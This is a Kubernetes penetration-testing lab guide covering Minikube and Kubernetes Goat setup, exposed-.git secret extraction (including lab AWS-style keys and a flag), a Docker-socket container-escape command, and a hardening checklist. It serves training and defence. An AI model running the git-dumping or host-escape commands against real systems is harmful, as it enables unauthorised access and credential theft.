# Cloud Kubernetes Penetration Testing & Configuration Review Guide
![flower](https://kubernetes.io/_common-resources/images/flower.svg)
A hands-on, step-by-step guide to setting up a local Kubernetes security assessment laboratory using **Minikube** and **Kubernetes Goat**, along with practical vulnerability scenario walkthroughs.

---

## 📋 Table of Contents
- [Overview](#-overview)
- [Prerequisites & Tools](#-prerequisites--tools)
- [Part 1: Setting Up Minikube](#part-1-setting-up-minikube)
- [Part 2: Deploying Kubernetes Goat](#part-2-deploying-kubernetes-goat)
- [Part 3: Practical Scenario Walkthroughs](#part-3-practical-scenario-walkthroughs)
  - [Scenario 1: Sensitive Keys in Codebases (Exposed `.git`)](#scenario-1-sensitive-keys-in-codebases-exposed-git)
  - [Scenario 2: DIND (Docker-in-Docker) Exploitation](#scenario-2-dind-docker-in-docker-exploitation)
- [Part 4: Configuration Review Checklist](#part-4-configuration-review-checklist)

---

## 🔍 Overview

This guide provides instructions for setting up an isolated Kubernetes penetration testing environment on Linux. You will learn how to deploy an intentionally vulnerable cluster (Kubernetes Goat) locally via Minikube and perform security assessments, container escape techniques, and secret exfiltration.

---

## 🛠 Prerequisites & Tools

### Minimum Hardware Requirements
* **CPU:** 2 Cores
* **RAM:** 2 GB minimum (4 GB recommended)
* **Disk Space:** 20 GB free disk space
* **Container Runtime:** Docker Engine

### Key Tools
1. **Minikube:** Runs a single-node Kubernetes cluster locally inside a VM or container.
2. **Kubernetes Goat:** An intentionally vulnerable Kubernetes cluster simulating real-world cloud-native misconfigurations and attack vectors.
3. **Helm:** Package manager for Kubernetes used to deploy application charts.
4. **kubectl:** Kubernetes CLI command-line tool.

---

## Part 1: Setting Up Minikube

Execute the following commands from a terminal on your local Linux machine (e.g., Kali Linux or Ubuntu).

### 1. Download and Install Minikube
```bash
# Download the latest binary release for x86-64 Linux
curl -LO https://github.com/kubernetes/minikube/releases/latest/download/minikube-linux-amd64

# Grant execution permissions
chmod +x minikube-linux-amd64

# Install binary to /usr/local/bin
sudo install minikube-linux-amd64 /usr/local/bin/minikube && rm minikube-linux-amd64
```

### 2. Start the Minikube Cluster
Run the start command from a non-root user (or use `--force` if executing as root):

```bash
minikube start
```
*Note: Minikube will automatically select the Docker driver and download preloaded Kubernetes binaries.*

### 3. Configure `kubectl`
Minikube includes an embedded version of `kubectl`. You can use it directly or alias it for convenience:

```bash
# Verify cluster pods using Minikube's kubectl
minikube kubectl -- get pods -A

# Create a shell alias for convenience
alias kubectl="minikube kubectl --"
```

To verify cluster state, list all running pods across namespaces:
```bash
kubectl get po -A
```

### 4. Enable Kubernetes Dashboard (Optional)
To visualize cluster resources:
```bash
minikube dashboard
```

---

## Part 2: Deploying Kubernetes Goat

### 1. Install Helm Package Manager
```bash
# Download Helm installer script
curl -fsSL -o get_helm.sh https://raw.githubusercontent.com/helm/helm/main/scripts/get-helm-4

# Set permissions and install
chmod 700 get_helm.sh
./get_helm.sh
```

### 2. Clone and Setup Kubernetes Goat
```bash
# Clone the repository
git clone https://github.com/madhuakula/kubernetes-goat.git
cd kubernetes-goat

# Make setup script executable and run
chmod +x setup-kubernetes-goat.sh
bash setup-kubernetes-goat.sh
```

### 3. Verify Deployment
Ensure all target pods are up and in the `Running` state before proceeding:
```bash
kubectl get pods
```

Expected pods output:
* `batch-check-job-*`
* `build-code-deployment-*`
* `health-check-deployment-*`
* `hidden-in-layers-*`
* `internal-proxy-deployment-*`
* `kubernetes-goat-home-deployment-*`
* `metadata-db-*`
* `poor-registry-deployment-*`
* `system-monitor-deployment-*`

### 4. Expose Services Locally
To access the vulnerable scenarios locally via port forwarding:
```bash
bash access-kubernetes-goat.sh
```
This script maps scenario endpoints to local ports `1230` through `1236`.
- **Kubernetes Goat Home:** `http://127.0.0.1:1234`

---

## Part 3: Practical Scenario Walkthroughs

### Scenario 1: Sensitive Keys in Codebases (Exposed `.git`)

#### 📌 Vulnerability Explanation
Developers frequently commit sensitive information (credentials, API keys, private keys) into Git repositories. When deploying applications to Kubernetes, exposure of the `.git` directory via misconfigured web servers allows attackers to download source code history and extract hardcoded secrets.

#### 🚩 Walkthrough & Exploitation

1. **Enumeration:**
   Navigate to the target port (Port `1230`) and check for exposed Git metadata:
   ```text
   http://127.0.0.1:1230/.git/config
   ```

2. **Dumping the Repository:**
   Use a Git dumping tool or download the repository structure locally:
   ```bash
   mkdir gitdump && cd gitdump
   wget -r -np -nH --cut-dirs=1 http://127.0.0.1:1230/.git/
   ```

3. **Analyzing Git History:**
   Inspect the commit logs to find historical changes where secrets may have been committed:
   ```bash
   git log
   ```
   *Sample Commit Output:*
   ```text
   commit d7c173ad183c574109cd5c4c648ffe551755b576
   Author: Madhu Akula <madhu.akula@hotmail.com>
   Date:   Fri Nov 6 23:31:06 2020 +0100

       Inlcuded custom environmental variables
   ```

4. **Checking Out Vulnerable Commit:**
   Switch to the target commit that introduced the custom environment variables:
   ```bash
   git checkout d7c173ad183c574109cd5c4c648ffe551755b576
   ```

5. **Extracting Secrets:**
   Examine the recovered files (e.g., `.env` file):
   ```bash
   cat .env
   ```
   *Extracted Flag & Credentials:*
   ```ini
   [build-code-aws]
   aws_access_key_id = AKIVSHD6243H2261KIDC
   aws_secret_access_key = cg6n4+gDgnriogn4g+34ig4bg34g44gg4Dox7c1M
   k8s_goat_flag = k8s-goat-51bc78332065561b0c99280f62510bcc
   ```

---

### Scenario 2: DIND (Docker-in-Docker) Exploitation

#### 📌 Vulnerability Explanation
CI/CD systems and containerized build pipelines often mount the host node's Docker socket (`/var/run/docker.sock`) into a pod to build images inside containers. Mounting the host UNIX socket gives container workloads root permissions over the underlying host's Docker daemon, allowing full container escapes to the host system.

#### 🚩 Walkthrough & Exploitation

1. **Identify Exposed Socket:**
   Check inside the container for mounted host Docker sockets:
   ```bash
   ls -la /var/run/docker.sock
   ```

2. **Interact with Host Docker Daemon:**
   If the socket is present, download or execute the `docker` binary pointing to the mounted socket:
   ```bash
   docker -H unix:///var/run/docker.sock ps
   ```

3. **Perform Container Escape:**
   Run a new container that mounts the host node's root filesystem (`/`) to gain root access to the host machine:
   ```bash
   docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
   ```

---

## Part 4: Configuration Review Checklist

When performing security audits or configuration reviews on Kubernetes workloads, evaluate against the following controls:

| Check Category | Verification Step | Recommendation |
| :--- | :--- | :--- |
| **Secrets Management** | Scan images & `.git` repos for hardcoded credentials. | Use Kubernetes Secrets or external secret managers (e.g., HashiCorp Vault). |
| **Volume Mounts** | Audit mounted host paths (`/var/run/docker.sock`, `/proc`, `/sys`). | Avoid mounting host sockets or root host paths into containers. |
| **Pod Security** | Check if containers run as `root` or `privileged: true`. | Set `allowPrivilegeEscalation: false` and `runAsNonRoot: true`. |
| **RBAC Policies** | Review ServiceAccount permissions assigned to pods. | Practice Least Privilege; restrict default ServiceAccount tokens. |
| **Network Policies** | Audit ingress and egress policies between namespaces. | Implement strict NetworkPolicies to isolate workloads. |
